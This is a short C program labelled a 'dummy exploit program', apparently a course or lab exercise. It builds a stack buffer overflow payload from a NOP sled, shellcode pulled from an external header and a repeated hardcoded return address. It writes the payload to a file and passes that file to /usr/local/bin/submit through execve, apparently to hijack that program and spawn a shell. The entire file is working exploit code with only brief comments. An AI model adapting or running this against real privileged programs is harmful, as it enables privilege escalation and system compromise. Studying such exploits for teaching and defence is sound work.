/*
 * dummy exploit program
 */

#include <stdio.h>
#include <unistd.h>
#include </usr/local/src/shellcode.h>

#define PAYLOAD_SIZE (540)
#define NOP (0x90)

int main(int argc, char **argv) {
	char payload[PAYLOAD_SIZE], *it, *args[4];
	int i;
	const int slen = strlen(shellcode);
	const int halfway = PAYLOAD_SIZE / 2;
	long *addr_ptr;
	FILE *payload_file;

	/* The address of the target buffer */
	long *addr = (long*) 0xffbfdc58;

	/* Fill the payload with the address of the target buffer */
	addr_ptr = (long*) payload;
	for (i = 0; i < PAYLOAD_SIZE; i+=4) {
		*(addr_ptr++) = (long) addr;
	}

	/* Padding NOP's to the first-half of the payload */
	memset(payload, NOP, halfway);

	/* Put the shell code into the payload */
	it = payload + (halfway - slen/2);
	memcpy(it, shellcode, slen);

	/* Dump the payload into a file called "out" */
	if ((payload_file = fopen("out", "w+")) == NULL) {
		puts("Cannot open 'out' for writing the payload");
		return -1;
	}

	fprintf(payload_file, "%s", payload);
	fclose(payload_file);

	/* set up arguments and then run the exploit */
	args[0] = "/usr/local/bin/submit";
	args[1] = "out";
	args[2] = "whatever";
	args[3] = NULL;

	// return -1 means error; otherwise will do return
	return execve(args[0], args, NULL);
}
